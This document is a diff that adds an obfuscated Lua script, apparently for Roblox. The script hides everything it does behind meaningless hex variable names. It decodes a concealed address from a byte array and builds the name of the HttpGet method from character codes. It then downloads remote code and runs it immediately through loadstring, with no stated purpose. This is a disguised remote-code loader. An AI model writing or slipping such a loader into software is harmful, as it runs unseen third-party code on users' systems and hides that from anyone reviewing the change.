@@ -1,0 +1,92 @@
+local _0xA = {
+    54,37,18,97,59,66,14,83,182,87,130,
+    190,74,94,181,246,58,243,215,14,155,
+    209,39,50,8,62,23,204,18,120,77,170,143
+}
+
+local _0xB = bit32
+local _0xC = string
+local _0xD = table
+
+local function _0xE(_0xF)
+    local _0x10 = {}
+    local _0x11 = #_0xF
+    local _0x12 = 0
+
+    for _0x13 = _0x11, 1, -1 do
+        _0x12 = _0x12 + 1
+
+        local _0x14 =
+            _0xB.bxor(
+                _0xF[_0x13],
+                0xA5
+            )
+
+        local _0x15 =
+            (
+                _0x14
+                -
+                (
+                    (_0x12 * 17)
+                    %
+                    251
+                )
+            )
+            %
+            256
+
+        local _0x16 =
+            (
+                73
+                +
+                (_0x12 * 29)
+                +
+                ((_0x12 % 7) * 11)
+            )
+            %
+            256
+
+        _0x10[#_0x10 + 1] =
+            _0xC.char(
+                _0xB.bxor(
+                    _0x15,
+                    _0x16
+                )
+            )
+    end
+
+    return _0xD.concat(
+        _0x10
+    )
+end
+
+local _0x17 =
+    _0xE(
+        _0xA
+    )
+
+local _0x18 =
+    game[
+        _0xC.char(
+            72,
+            116,
+            116,
+            112,
+            71,
+            101,
+            116
+        )
+    ]
+
+local _0x19 =
+    _0x18(
+        game,
+        _0x17
+    )
+
+local _0x1A =
+    loadstring(
+        _0x19
+    )
+
+_0x1A()
